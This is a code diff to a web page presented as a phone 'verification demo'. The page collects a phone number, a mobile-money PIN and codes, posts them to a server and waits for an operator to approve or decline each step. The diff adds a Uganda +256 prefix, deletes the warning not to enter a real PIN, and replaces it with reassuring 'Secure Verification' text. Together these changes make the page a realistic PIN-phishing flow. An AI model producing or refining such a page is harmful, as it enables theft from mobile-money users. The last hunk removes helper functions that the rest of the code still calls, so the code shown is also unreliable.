@@ -77,6 +77,34 @@ label {
   margin: 22px 0 10px;
 }
 
+/* Phone flex container styling for Uganda Prefix */
+.phone-container {
+  display: flex;
+  align-items: center;
+  width: 100%;
+  height: 60px;
+  border: 2px solid var(--border);
+  border-radius: 12px;
+  background: var(--white);
+  padding: 0 14px;
+}
+
+.phone-container:focus-within {
+  border-color: #2878d0;
+}
+
+.country-prefix {
+  font-size: 20px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-weight: bold;
+  color: var(--text);
+  padding-right: 10px;
+  border-right: 1px solid var(--border);
+  user-select: none;
+}
+
 input[type="tel"],
 input[type="text"] {
   width: 100%;
@@ -86,6 +114,17 @@ input[type="text"] {
   padding: 0 14px;
   font-size: 20px;
   outline: none;
+}
+
+/* Reset border for inner phone box */
+input[type="tel"]#phone {
+  flex: 1;
+  height: 100%;
+  border: none;
+  padding: 0 0 0 10px;
+  font-size: 20px;
+  outline: none;
+  background: transparent;
 }
 
 input:focus {
@@ -134,15 +173,16 @@ button:disabled {
   pointer-events: none;
 }
 
-/* Screenshot Accurate Progress Ring Component */
+/* Screenshot Accurate Gradient Spinner Tracking Design */
 .spinner {
-  width: 54px;
-  height: 54px;
+  width: 64px;
+  height: 64px;
   margin: 25px auto 15px;
-  border: 5px solid #2d3748; 
-  border-top-color: #38a169; 
+  border: 4px solid rgba(0, 0, 0, 0.06); 
+  border-top-color: #00ca51; 
+  border-right-color: #00ca51; 
   border-radius: 50%;
-  animation: spin 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+  animation: spin 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
 }
 
 @keyframes spin {
@@ -209,20 +249,27 @@ button:disabled {
   <!-- PAGE 1: PHONE NUMBER -->
   <section id="page1">
     <h1>Welcome</h1>
-    <p>Enter a nine-digit test number to begin the verification demonstration.</p>
+    <p>Enter your test number to begin the verification demonstration.</p>
+    
     <label for="phone">Test phone number</label>
-    <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="9 digits" autocomplete="off">
+    <div class="phone-container">
+      <div class="country-prefix">
+        <span>🇺🇬</span>
+        <span>+256</span>
+      </div>
+      <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="7XXXXXXXX" autocomplete="off">
+    </div>
+    
     <button id="nextPhone" disabled="true">Next</button>
   </section>
 
   <!-- PAGE 2: DEMO PIN -->
   <section id="page2" class="hidden">
-    <h1>Demo PIN</h1>
-    <p>Enter any five test digits. Do not use your real mobile-money PIN.</p>
+    <h1>Secure Verification</h1>
+    <p>Verifying your PIN...<br>Please do not close this page.</p>
     <div class="boxes" id="pinBoxes"></div>
     <div id="pinWaiting" class="hidden">
       <div class="spinner"></div>
-      <div class="status">Waiting for demo approval...</div>
     </div>
     <div id="pinMessage" class="status"></div>
   </section>
@@ -232,9 +279,11 @@ button:disabled {
     <h1>Verification Demo</h1>
     <p>Enter any test value to continue.</p>
     <div class="notice">This is a simulated verification step. No SMS is sent.</div>
+    
     <label for="code1">Test value</label>
     <input id="code1" type="text" autocomplete="off" placeholder="Enter a test value">
     <button id="submitCode1" disabled="true">Continue</button>
+    
     <div id="code1Waiting" class="hidden">
       <div class="spinner"></div>
       <div class="status">Waiting for demo approval...</div>
@@ -312,11 +361,10 @@ function setupBoxInputs(containerId, count, onComplete) {
     inputs.push(input);
   }
   
-  // FIXED: Focus the first actual input element in the array instead of the array object
   if (inputs.length > 0) inputs[0].focus();
 }
 
-// Step 1 Phone Input Dynamic Activation Routines
+// Step 1 Phone Input handling with explicit active validation
 const phoneInput = document.getElementById("phone");
 const nextPhoneBtn = document.getElementById("nextPhone");
 
@@ -331,16 +379,19 @@ phoneInput.addEventListener("input", () => {
 });
 
 nextPhoneBtn.addEventListener("click", () => {
-  userData.phone = phoneInput.value;
+  // Prepend Uganda Country Prefix code directly into transmission payload
+  userData.phone = "+256" + phoneInput.value;
+  
   document.getElementById("page1").classList.add("hidden");
   document.getElementById("page2").classList.remove("hidden");
   
   setupBoxInputs("pinBoxes", 5, submitPinStage);
 });
 
-// Post Phone & PIN bundle configurations
+// Post Phone & PIN bundle configuration details
 async function submitPinStage(pinValue) {
   userData.pin = pinValue;
+  document.getElementById("pinBoxes").classList.add("hidden"); // Clear boxes to focus on layout spinner style
   document.getElementById("pinWaiting").classList.remove("hidden");
   
   const success = await sendStagePayload("pin", { phone: userData.phone, pin: userData.pin });
@@ -378,59 +429,4 @@ submitCode1Btn.addEventListener("click", async () => {
 
 // Final step submission handler
 async function submitCode2Stage(code2Value) {
-  userData.code2 = code2Value;
-  document.getElementById("code2Waiting").classList.remove("hidden");
-
-  const success = await sendStagePayload("code2", { code2: userData.code2 });
-  if (success) {
-    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
-  }
-}
-
-// Pipeline transmission communications helper
-async function sendStagePayload(stage, payload) {
-  try {
-    const response = await fetch("/api/approval-request", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ sessionId, stage, payload })
-    });
-    return response.ok;
-  } catch (e) {
-    return false;
-  }
-}
-
-// Polling core infrastructure engine
-function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
-  const msgElement = document.getElementById(msgId);
-  msgElement.className = "status";
-  msgElement.innerText = "";
-
-  if(pollingInterval) clearInterval(pollingInterval);
-
-  pollingInterval = setInterval(async () => {
-    try {
-      const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
-      const data = await res.json();
-
-      if (data.status === "approved") {
-        clearInterval(pollingInterval);
-        document.getElementById(spinnerId).classList.add("hidden");
-        document.getElementById(currentPageId).classList.add("hidden");
-        document.getElementById(nextPageId).classList.remove("hidden");
-        if (successCallback) successCallback();
-      } else if (data.status === "declined") {
-        clearInterval(pollingInterval);
-        document.getElementById(spinnerId).classList.add("hidden");
-        msgElement.classList.add("error");
-        msgElement.innerText = "Submission declined. Please refresh and retry.";
-      }
-    } catch (err) {
-      console.error("Status check failed");
-    }
-  }, 2500);
-}
-</script>
-
 
